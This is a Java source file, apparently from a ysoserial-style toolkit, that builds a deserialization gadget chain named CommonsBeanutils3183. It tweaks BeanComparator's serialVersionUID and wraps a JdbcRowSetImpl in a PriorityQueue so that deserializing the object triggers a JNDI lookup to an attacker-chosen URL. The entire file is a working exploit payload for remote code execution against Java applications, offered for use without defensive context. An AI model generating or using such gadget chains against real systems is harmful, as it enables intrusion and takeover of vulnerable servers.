package A.R.ysogate.payloads.gadgets;

import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassClassPath;
import javassist.CtClass;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Reflections;
import A.R.ysogate.payloads.util.SuClassLoader;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static A.R.ysogate.payloads.config.Config.POOL;
import static A.R.ysogate.payloads.handle.ClassFieldHandler.insertField;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils3183 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}

		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		Reflections.setFieldValue(comparator, "property", null);
		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("su18");
		PriorityQueue queue = new PriorityQueue(2, comparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});

		ctBeanComparator.defrost();
		return queue;
	}
}
